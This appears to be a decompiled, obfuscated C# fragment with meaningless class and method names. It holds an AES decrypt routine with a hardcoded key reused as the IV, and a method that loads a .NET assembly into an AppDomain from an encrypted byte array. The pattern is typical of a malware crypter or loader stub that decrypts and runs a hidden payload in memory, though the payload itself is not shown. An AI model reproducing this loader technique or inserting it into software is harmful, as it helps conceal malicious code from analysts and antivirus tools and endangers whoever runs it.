using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;

namespace OlLP4ANbrNNh;

internal class Class4
{
	internal class CultureAndContextManager
	{
		internal static byte[] Decrypt(byte[] plainBytes)
		{
			byte[] array = new byte[16]
			{
				200, 158, 84, 28, 83, 123, 52, 129, 144, 65,
				5, 78, 185, 215, 160, 128
			};
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.Key = array;
			rijndaelManaged.IV = array;
			rijndaelManaged.Mode = CipherMode.CBC;
			rijndaelManaged.Padding = PaddingMode.None;
			using ICryptoTransform transform = rijndaelManaged.CreateDecryptor(array, rijndaelManaged.IV);
			using MemoryStream memoryStream = new MemoryStream();
			using CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
			cryptoStream.Write(plainBytes, 0, plainBytes.Length);
			cryptoStream.FlushFinalBlock();
			return memoryStream.ToArray();
		}
	}

	internal static Assembly smethod_0(AppDomain appDomain_0)
	{
		return appDomain_0.Load(Class0.smethod_0(new byte[30]
		{
			58, 205, 76, 11, 216, 116, 190, 24, 13, 163,
			1, 69, 207, 59, 95, 26, 217, 155, 197, 93,
			179, 200, 71, 45, 210, 196, 140, 158, 103, 68
		}));
	}
}
